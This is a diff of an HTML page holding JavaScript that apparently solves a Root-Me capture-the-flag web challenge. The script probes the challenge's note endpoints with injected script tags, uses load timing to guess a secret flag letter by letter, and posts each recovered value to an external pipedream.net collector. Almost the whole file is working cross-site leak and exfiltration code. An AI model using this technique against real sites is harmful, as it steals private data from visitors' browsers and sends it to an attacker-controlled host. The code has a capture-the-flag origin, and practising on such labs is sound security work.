@@ -1,36 +1,62 @@
-<script>
-function sendRequest(url) {
-    let xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://eocvkn4m3kpce3q.m.pipedream.net");
-    xhr.send(url);
-}
-
-var idFound = false;
-    
-async function attack() {
-    sendRequest("test=true");
-    let i = 0;
-    while (!idFound && i < 5000) {
-        try {
-            await new Promise((resolve, reject) => {
-                var script = document.createElement('script');
-                script.src = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${i}`;
-                document.body.appendChild(script);
-                
-                script.onload = () => {
-                    idFound = true;
-                    sendRequest(`id=${i}`);
-                    resolve();
-                }
-                script.onerror = reject;
-                sendRequest("test="+i);
-            })
-            
-        } catch (error) {
-            i++;
-            continue;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>
+        function sendRequest(url) {
+            let xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://eocvkn4m3kpce3q.m.pipedream.net");
+            xhr.send(url);
         }
-    }      
-}
-attack();
-</script>
+            
+        async function attack() {
+            sendRequest("test=true")
+            let noteName = "";
+            let lowercase_letters = "azertyuiopmlkjhgfdsqwxcvbn"; //the flag is supposed to be composed of only lowercase letters
+            //suposing the flag is 32 characters long
+            let i = 0;
+            console.log("launching")
+            while (i < 10001 && noteName.length < 32) {
+                let j = 0;
+                while (i < 10001 && j < lowercase_letters.length) {
+                    console.log("i: ", i, "j: ", j)
+                    const l = lowercase_letters[j];
+                    try {
+                        await new Promise((resolve, reject) => {
+                            //fetch page
+                            var script = document.createElement('script');
+                            script.src = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${i}/${noteName + l}`;
+                            document.body.appendChild(script);
+                            // Start the clock
+                            var start = performance.now();
+                            
+                            // When script loads, caculate the time it took to finish the request
+                            script.onload = () => {
+                                var time = performance.now() - start;
+                                if (time > 1500) {
+                                    noteName += l;
+                                    sendRequest(`note_name=${noteName}`);
+                                }
+                                resolve();
+                            }
+                            script.onerror = reject;
+                        })
+                        
+                    } catch (error) {
+                        i+=1;
+                        j=0;
+                        continue;
+                    }
+                    j++;
+                }
+            }      
+        }
+        attack();
+        </script>
+        
+</body>
+</html>
